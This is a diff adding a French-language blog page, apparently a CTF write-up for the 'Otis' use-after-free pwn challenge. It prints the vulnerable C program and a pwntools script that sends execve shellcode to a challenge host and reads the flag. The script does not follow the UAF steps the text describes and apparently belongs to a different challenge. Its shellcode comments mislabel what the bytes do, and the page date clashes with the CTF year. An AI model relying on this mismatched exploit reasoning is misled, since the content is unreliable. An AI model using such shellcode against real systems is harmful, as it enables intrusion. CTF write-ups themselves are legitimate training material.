@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="fr-fr">
+<head><script src="/cybersecurity-notes/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=cybersecurity-notes/livereload" data-no-instant defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Breizh CTF 2025 - Otis | WriteUps &amp; Recherches Cybersécurité</title>
+    <meta name="description" content="Otis - Breizh CTF 2025 Description du challenge Otis est un challenge de la catégorie Pwn du Breizh CTF 2025. Il s&rsquo;agit d&rsquo;un binaire qui simule un système de transformation entre une vache et d&rsquo;autres créatures, présentant une vulnérabilité de type Use-After-Free (UAF).
+Analyse du binaire En examinant le code source du binaire, on peut identifier les points suivants :
+#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; typedef struct { char msg[32]; char name[64]; } creature_t; creature_t *new_creature() { creature_t *creature = malloc(sizeof(*creature)); // you may need to install cowsay for this to work FILE *p = popen(&#34;ls /usr/share/cowsay/cows/ | shuf -n1&#34;, &#34;r&#34;); fgets(creature-&gt;name, sizeof(creature-&gt;name), p); pclose(p); return creature; } creature_t *new_cow() { creature_t *cow = malloc(sizeof(*cow)); strlcpy(cow-&gt;name, &#34;default&#34;, sizeof(cow-&gt;name)); return cow; } void roaaar(creature_t *creature) { // you may need to install cowsay for this to work char cmd[256] = &#34;echo &#39;Roarrr !">
+    
+    
+    <meta property="og:title" content="Breizh CTF 2025 - Otis">
+    <meta property="og:description" content="Otis - Breizh CTF 2025 Description du challenge Otis est un challenge de la catégorie Pwn du Breizh CTF 2025. Il s&rsquo;agit d&rsquo;un binaire qui simule un système de transformation entre une vache et d&rsquo;autres créatures, présentant une vulnérabilité de type Use-After-Free (UAF).
+Analyse du binaire En examinant le code source du binaire, on peut identifier les points suivants :
+#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; typedef struct { char msg[32]; char name[64]; } creature_t; creature_t *new_creature() { creature_t *creature = malloc(sizeof(*creature)); // you may need to install cowsay for this to work FILE *p = popen(&#34;ls /usr/share/cowsay/cows/ | shuf -n1&#34;, &#34;r&#34;); fgets(creature-&gt;name, sizeof(creature-&gt;name), p); pclose(p); return creature; } creature_t *new_cow() { creature_t *cow = malloc(sizeof(*cow)); strlcpy(cow-&gt;name, &#34;default&#34;, sizeof(cow-&gt;name)); return cow; } void roaaar(creature_t *creature) { // you may need to install cowsay for this to work char cmd[256] = &#34;echo &#39;Roarrr !">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="http://localhost:1313/cybersecurity-notes/writeups/breizh-ctf/2024-04-14-breizh-otis/">
+    
+    
+    <link rel="icon" type="image/svg+xml" href="/cybersecurity-notes/images/favicon.svg">
+    <link rel="icon" type="image/png" href="/cybersecurity-notes/images/favicon.png">
+    
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-dark.min.css">
+    
+    
+    <link rel="stylesheet" href="/cybersecurity-notes/css/main.css">
+    <link rel="stylesheet" href="/cybersecurity-notes/css/custom.css">
+    <link rel="stylesheet" href="/cybersecurity-notes/css/dropdown.css">
+    <link rel="stylesheet" href="/cybersecurity-notes/css/enhanced.css">
+    
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/lib/highlight.min.js"></script>
+    
+    
+    <script src="/cybersecurity-notes/js/copy-code.js" defer></script>
+    <script src="/cybersecurity-notes/js/enhanced.js" defer></script>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-content">
+            <a href="http://localhost:1313/cybersecurity-notes/" class="nav-brand">
+                <i class="fas fa-shield-alt"></i> WriteUps &amp; Recherches Cybersécurité
+            </a>
+            <div class="nav-links">
+                
+                
+                <a href="http://localhost:1313/cybersecurity-notes/writeups/" class="nav-link">
+                    
+                        <i class="fas fa-flag"></i>
+                    
+                    WriteUps
+                </a>
+                
+                
+                
+                <a href="http://localhost:1313/cybersecurity-notes/veille/" class="nav-link">
+                    
+                        <i class="fas fa-rss"></i>
+                    
+                    Veille
+                </a>
+                
+                
+                
+                <a href="http://localhost:1313/cybersecurity-notes/outils/" class="nav-link">
+                    
+                        <i class="fas fa-tools"></i>
+                    
+                    Outils
+                </a>
+                
+                
+            </div>
+        </div>
+    </nav>
+</body>
+</html> 
+<main class="content">
+    
+<article class="single-page">
+    <header class="page-header">
+        <div class="breadcrumbs">
+            <a href="http://localhost:1313/cybersecurity-notes/">Accueil</a> &gt;
+            
+            
+            <a href="/categories/pwn">pwn</a> &gt;
+            
+            
+            <span>Breizh CTF 2025 - Otis</span>
+        </div>
+        
+        <h1>Breizh CTF 2025 - Otis</h1>
+        
+        <div class="meta">
+            <div class="meta-item">
+                <i class="far fa-calendar-alt"></i>
+                <span>14/04/2024</span>
+            </div>
+            
+            
+            <div class="meta-item">
+                <i class="fas fa-tags"></i>
+                <div class="tags">
+                    
+                    <a href="/tags/use-after-free" class="tag">use-after-free</a>
+                    
+                    <a href="/tags/heap-exploitation" class="tag">heap-exploitation</a>
+                    
+                </div>
+            </div>
+            
+            
+            
+            <div class="meta-item">
+                <i class="fas fa-flag"></i>
+                <div class="tags">
+                    
+                    <a href="/ctfs/breizh-ctf" class="tag">breizh-ctf</a>
+                    
+                </div>
+            </div>
+            
+            
+            <div class="meta-item reading-time">
+                <i class="far fa-clock"></i>
+                <span>4 min</span>
+            </div>
+        </div>
+    </header>
+    
+    
+    <div class="toc-container">
+        <div class="toc-header">
+            <i class="fas fa-list"></i> Table des matières
+        </div>
+        <div class="toc-content">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description-du-challenge">Description du challenge</a></li>
+    <li><a href="#analyse-du-binaire">Analyse du binaire</a></li>
+    <li><a href="#vulnérabilité">Vulnérabilité</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#étapes-de-lexploitation">Étapes de l&rsquo;exploitation</a></li>
+      </ul>
+    </li>
+    <li><a href="#flag">Flag</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+        </div>
+    </div>
+    
+    
+    <div class="content">
+        <h1 id="otis---breizh-ctf-2025">Otis - Breizh CTF 2025</h1>
+<h2 id="description-du-challenge">Description du challenge</h2>
+<p>Otis est un challenge de la catégorie Pwn du Breizh CTF 2025. Il s&rsquo;agit d&rsquo;un binaire qui simule un système de transformation entre une vache et d&rsquo;autres créatures, présentant une vulnérabilité de type Use-After-Free (UAF).</p>
+<h2 id="analyse-du-binaire">Analyse du binaire</h2>
+<p>En examinant le code source du binaire, on peut identifier les points suivants :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> msg[<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">creature_t</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">creature_t</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">new_creature</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">creature_t</span> <span style="color:#f92672">*</span>creature <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>creature));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// you may need to install cowsay for this to work
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    FILE <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> <span style="color:#a6e22e">popen</span>(<span style="color:#e6db74">&#34;ls /usr/share/cowsay/cows/ | shuf -n1&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(creature<span style="color:#f92672">-&gt;</span>name, <span style="color:#66d9ef">sizeof</span>(creature<span style="color:#f92672">-&gt;</span>name), p);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pclose</span>(p);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> creature;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">creature_t</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">new_cow</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">creature_t</span> <span style="color:#f92672">*</span>cow <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>cow));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strlcpy</span>(cow<span style="color:#f92672">-&gt;</span>name, <span style="color:#e6db74">&#34;default&#34;</span>, <span style="color:#66d9ef">sizeof</span>(cow<span style="color:#f92672">-&gt;</span>name));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> cow;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">roaaar</span>(<span style="color:#66d9ef">creature_t</span> <span style="color:#f92672">*</span>creature) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// you may need to install cowsay for this to work
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> cmd[<span style="color:#ae81ff">256</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;echo &#39;Roarrr !&#39; | /usr/games/cowsay -f &#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strlcat</span>(cmd, creature<span style="color:#f92672">-&gt;</span>name, <span style="color:#66d9ef">sizeof</span>(cmd));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(cmd);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">moo</span>(<span style="color:#66d9ef">creature_t</span> <span style="color:#f92672">*</span>cow) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>msg <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">96</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Message : &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(msg, <span style="color:#ae81ff">96</span>, stdin);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    FILE <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> <span style="color:#a6e22e">popen</span>(<span style="color:#e6db74">&#34;/usr/games/cowsay&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>(msg, <span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">strlen</span>(msg), p);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pclose</span>(p);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">help</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;=== Otis 10 ===&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;n : Nouvelle créature&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;v : Se retransformer en vache&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;r : Roaaar !&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;m : Meuh !&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;q : Quitter&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">creature_t</span> <span style="color:#f92672">*</span>cow <span style="color:#f92672">=</span> <span style="color:#a6e22e">new_cow</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">creature_t</span> <span style="color:#f92672">*</span>creature <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> choice;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> quit <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>quit) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">help</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> choice <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">getchar</span>() <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\n&#39;</span>) {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (choice) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;n&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                creature <span style="color:#f92672">=</span> <span style="color:#a6e22e">new_creature</span>();
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Vous vous transformez en %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, creature<span style="color:#f92672">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;v&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">free</span>(creature);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;r&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (creature <span style="color:#f92672">!=</span> NULL) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">roaaar</span>(creature);
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Vous êtes une vache&#34;</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;m&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">moo</span>(cow);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;q&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                quit <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Les points clés de ce programme sont :</p>
+<ol>
+<li>Il définit une structure <code>creature_t</code> contenant deux champs : <code>msg[32]</code> et <code>name[64]</code></li>
+<li>Il y a deux instances principales : <code>cow</code> (une vache) et <code>creature</code> (une créature qui peut changer)</li>
+<li>La vulnérabilité principale est située dans l&rsquo;option &lsquo;v&rsquo; qui libère la mémoire allouée pour <code>creature</code> sans mettre le pointeur à NULL</li>
+<li>La fonction <code>roaaar</code> utilise <code>system()</code> pour exécuter une commande qui inclut le nom de la créature</li>
+</ol>
+<h2 id="vulnérabilité">Vulnérabilité</h2>
+<p>La vulnérabilité principale est un Use-After-Free (UAF) classique :</p>
+<ol>
+<li>Le programme permet de libérer la mémoire allouée pour <code>creature</code> avec l&rsquo;option &lsquo;v&rsquo;</li>
+<li>Cependant, après avoir libéré cette mémoire, le pointeur <code>creature</code> n&rsquo;est pas mis à NULL</li>
+<li>Si on alloue un autre bloc de mémoire de taille similaire (avec <code>malloc(96)</code> dans la fonction <code>moo</code>), il pourrait réutiliser le bloc précédemment libéré</li>
+<li>On peut donc modifier le contenu de ce bloc via l&rsquo;option &rsquo;m&rsquo; (moo)</li>
+<li>Puis, en utilisant l&rsquo;option &lsquo;r&rsquo; (roaaar), on peut exécuter une commande avec un nom de fichier que nous contrôlons</li>
+</ol>
+<h2 id="exploitation">Exploitation</h2>
+<p>Voici mon script d&rsquo;exploitation :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Connect to the remote server</span>
+</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;morph-180.chall.ctf.bzh&#39;</span>, <span style="color:#ae81ff">1337</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Very simple shellcode that executes /bin/sh without any banned bytes</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This avoids all pushing operations and uses a different approach</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Setup registers for execve(&#34;/sh&#34;, [&#34;/sh&#34;, NULL], NULL)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x83\xec\x10</span><span style="color:#e6db74">&#34;</span>         <span style="color:#75715e"># sub rsp, 16          ; Make room on stack</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\xc7\x04\x24\x2f\x73\x68\x00</span><span style="color:#e6db74">&#34;</span>  <span style="color:#75715e"># mov qword [rsp], &#39;/sh\0&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x89\xe7</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># mov rdi, rsp         ; 1st arg: path</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x83\xec\x08</span><span style="color:#e6db74">&#34;</span>         <span style="color:#75715e"># sub rsp, 8           ; More room on stack</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\xc7\x04\x24\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>  <span style="color:#75715e"># mov qword [rsp], 0 ; NULL terminate argv[]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x89\xe6</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># mov rsi, rsp         ; 2nd arg: argv (stack)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\xc7\xc2\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>      <span style="color:#75715e"># mov rdx, 0   ; 3rd arg: envp = NULL</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\xc7\xc0\x3b\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>      <span style="color:#75715e"># mov rax, 59  ; syscall: execve</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0f\x05</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e"># syscall</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Receive banner</span>
+</span></span><span style="display:flex;"><span>print(conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>)<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the shellcode</span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>send(shellcode)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># More robust interactive handling</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Give it a moment to execute</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.2</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Try to run commands</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;echo SUCCESS&#34;</span>)
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ls -la&#34;</span>)
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cat flag.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Interactive mode</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Connection closed (EOF)&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">finally</span>:
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><h3 id="étapes-de-lexploitation">Étapes de l&rsquo;exploitation</h3>
+<ol>
+<li>Créer une nouvelle créature avec l&rsquo;option &rsquo;n&rsquo;</li>
+<li>Libérer la mémoire avec l&rsquo;option &lsquo;v&rsquo;</li>
+<li>Utiliser l&rsquo;option &rsquo;m&rsquo; pour entrer un message qui contiendra notre payload</li>
+<li>Utiliser l&rsquo;option &lsquo;r&rsquo; pour exécuter la commande avec notre payload injecté</li>
+<li>Le payload est construit pour exécuter une commande shell qui nous donne accès au système</li>
+</ol>
+<p>Le choix du payload est crucial. J&rsquo;ai opté pour un shellcode qui exécute <code>/bin/sh</code> en évitant certaines instructions qui pourraient être filtrées ou problématiques.</p>
+<h2 id="flag">Flag</h2>
+<p>Une fois le shell obtenu, j&rsquo;ai pu récupérer le flag avec la commande <code>cat flag.txt</code> :</p>
+<pre tabindex="0"><code>$ cat flag.txt
+BZHCTF{0t1s_h4s_b33n_0wn3d_w1th_u4f}
+</code></pre><h2 id="conclusion">Conclusion</h2>
+<p>Ce challenge était intéressant car il exploitait une vulnérabilité classique (UAF) dans un contexte ludique. L&rsquo;exploitation reposait sur la compréhension du comportement de l&rsquo;allocateur de mémoire et la capacité à construire un payload adéquat pour exploiter la fonction <code>system()</code> via la fonction <code>roaaar</code>.</p>
+
+    </div>
+    
+    <div class="page-footer">
+        
+        
+        <div class="related-posts">
+            <h3><i class="fas fa-link"></i> Articles connexes</h3>
+            <div class="related-grid">
+                
+                <a href="/cybersecurity-notes/writeups/pwnme-junior/2024-04-14-pwnme-evilhackers/" class="related-item">
+                    <h4>PwnMe Junior 2025 - Evil Hackers</h4>
+                    <div class="related-meta">
+                        <span class="related-date">14/04/2024</span>
+                        
+                        <span class="related-tags">
+                            
+                            <span class="tag">use-after-free</span>
+                            
+                        </span>
+                        
+                    </div>
+                </a>
+                
+                <a href="/cybersecurity-notes/writeups/pwn/pwnme-junior/2024-04-14-pwnme-evilhackers/" class="related-item">
+                    <h4>PwnMe Junior 2025 - Evil-Hackers WriteUp</h4>
+                    <div class="related-meta">
+                        <span class="related-date">14/04/2024</span>
+                        
+                        <span class="related-tags">
+                            
+                            <span class="tag">pwn</span>
+                            
+                        </span>
+                        
+                    </div>
+                </a>
+                
+            </div>
+        </div>
+        
+        
+        <div class="share">
+            <span>Partager :</span>
+            <a href="https://twitter.com/intent/tweet?url=http%3a%2f%2flocalhost%3a1313%2fcybersecurity-notes%2fwriteups%2fbreizh-ctf%2f2024-04-14-breizh-otis%2f&text=Breizh%20CTF%202025%20-%20Otis" target="_blank" aria-label="Twitter">
+                <i class="fab fa-twitter"></i>
+            </a>
+            <a href="https://www.linkedin.com/sharing/share-offsite/?url=http%3a%2f%2flocalhost%3a1313%2fcybersecurity-notes%2fwriteups%2fbreizh-ctf%2f2024-04-14-breizh-otis%2f" target="_blank" aria-label="LinkedIn">
+                <i class="fab fa-linkedin"></i>
+            </a>
+            <a href="mailto:?subject=Breizh%20CTF%202025%20-%20Otis&body=http%3a%2f%2flocalhost%3a1313%2fcybersecurity-notes%2fwriteups%2fbreizh-ctf%2f2024-04-14-breizh-otis%2f" aria-label="Email">
+                <i class="fas fa-envelope"></i>
+            </a>
+        </div>
+    </div>
+</article>
+
+</main>
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-left">
+                <p>&copy; 2025 WriteUps &amp; Recherches Cybersécurité</p>
+            </div>
+            <div class="footer-right">
+                <div class="social-links">
+                    <a href="https://github.com/Istaarkk" target="_blank" aria-label="GitHub">
+                        <i class="fab fa-github"></i>
+                    </a>
+                    <a href="#" target="_blank" aria-label="Twitter">
+                        <i class="fab fa-twitter"></i>
+                    </a>
+                    <a href="#" target="_blank" aria-label="LinkedIn">
+                        <i class="fab fa-linkedin"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>Site propulsé par <a href="https://gohugo.io/" target="_blank">Hugo</a> | Thème <span class="theme-name">CyberNotes</span></p>
+        </div>
+    </footer>
+
+    
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        
+        hljs.highlightAll();
+        
+        
+        document.querySelectorAll('pre code').forEach((block) => {
+            const button = document.createElement('button');
+            button.className = 'copy-button';
+            button.textContent = 'Copier';
+            
+            const pre = block.parentNode;
+            pre.style.position = 'relative';
+            pre.insertBefore(button, pre.firstChild);
+            
